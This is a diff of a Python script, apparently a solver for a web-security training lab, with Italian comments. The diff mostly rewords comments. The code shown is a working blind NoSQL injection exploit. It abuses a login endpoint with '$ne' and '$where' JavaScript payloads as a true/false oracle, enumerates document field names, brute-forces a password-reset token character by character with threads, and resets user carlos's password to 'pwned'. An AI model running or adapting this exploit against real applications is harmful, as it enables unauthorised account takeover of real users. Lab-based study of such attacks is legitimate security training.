@@ -3,7 +3,7 @@ from concurrent.futures import ThreadPoolExecutor
 from rich.console import Console; from rich.panel import Panel
 from rich.live import Live; from rich.text import Text
 from rich.prompt import IntPrompt; from rich import box
-import typer, urllib3
+import typer, urllib3, random
 
 urllib3.disable_warnings()
 console = Console()
@@ -25,7 +25,7 @@ class NoSQLExploit:
             r = self.sess.post(f"{self.url}/login", json={
                 "username": "carlos",
                 "password": {"$ne": "invalid"}, # Bypass password standard
-                "$where": payload               # <--- IL NOSTRO PAYLOAD JAVASCRIPT
+                "$where": payload               # <--- PAYLOAD JAVASCRIPT
             }, timeout=3)
             return "Account locked" in r.text   # Oracolo Booleano (Vero/Falso)
         except: return False
@@ -48,7 +48,7 @@ class NoSQLExploit:
         charset = string.ascii_letters + string.digits + "-_!{}"
 
         def worker(pos):
-            # Mischia charset per sembrare più "hacker" e variare i pattern
+            # Mischia charset per variare i pattern (effetto grafico)
             shuffled = list(charset); random.shuffle(shuffled)
             for char in shuffled:
                 if self.stop or self.chars[pos]: return
@@ -56,13 +56,12 @@ class NoSQLExploit:
                 if self.check(char_check % (pos, char)):
                     self.chars[pos] = char; return
 
-        # Visualizzazione Matrix
-        import random # Import locale per pulizia
+        # Visualizzazione
         with Live(refresh_per_second=10) as live, ThreadPoolExecutor(max_workers=10) as ex:
             for i in range(length): ex.submit(worker, i)
             
             while not self.stop:
-                # Genera stringa visiva: Verde se trovato, Bianco random se mancante
+                # Genera stringa: Verde se trovato, Bianco random se mancante
                 display = Text(f"{desc}: ", style="cyan")
                 found = 0
                 for c in self.chars:
@@ -85,14 +84,14 @@ class NoSQLExploit:
         if self.sess.get(self.url).status_code != 200: return console.print("[red]Lab Down[/red]")
         self.reset_lab() 
 
-        # 1. Scansione DB (Enumera i nomi dei campi)
+        # 1. Scansione DB (enumerare i campi presenti)
         console.rule("[cyan]FASE 1: MAPPING DATABASE[/cyan]")
         found_fields = {}
+
         for i in range(10):
-            # Ottimizzazione: Se non c'è l'indice i, inutile provare
             if not self.check(f"Object.keys(this).length > {i}"): break
             
-            # Trova nome campo all'indice i
+            # Trova nome campo: Funziona in parallelo, ogni campo trova la stringa nell'indice i
             name = self.crack(
                 f"Object.keys(this)[{i}].length == %d",         # Payload Lunghezza
                 f"Object.keys(this)[{i}].match('^.{{%d}}%s.*')", # Payload Carattere (Regex)
@@ -100,13 +99,13 @@ class NoSQLExploit:
             )
             if name: found_fields[str(i)] = name; console.print(f"   [green]✔ Trovato:[/green] {name}")
 
-        # 2. Selezione Target
+        # 2. L'untete selezione il campo target da input
         console.print()
         target_idx = IntPrompt.ask("Quale campo contiene il token?", choices=list(found_fields.keys()))
         target_name = found_fields[str(target_idx)]
 
-        # 3. Estrazione Token
-        self.reset_lab() # Refresh per sicurezza
+        # 3. Estrazione Token: Funziona in parallelo, ogni campo trova la stringa nell'indice i
+        self.reset_lab()
         console.rule(f"[cyan]FASE 2: DECRYPTING {target_name.upper()}[/cyan]")
         token = self.crack(
             f"this.{target_name}.length == %d",        # Payload Lunghezza Valore
@@ -123,7 +122,7 @@ class NoSQLExploit:
         csrf = self.get_csrf(f"{self.url}/forgot-password?{field}={token}")
         if not csrf: return console.print("[red]Errore CSRF[/red]")
 
-        # Reset Password
+        # Esegue il reset della password usando il token trovato
         self.sess.post(f"{self.url}/forgot-password", data={
             "csrf": csrf, "username": "carlos", "new-password-1": "pwned", "new-password-2": "pwned", field: token
         })
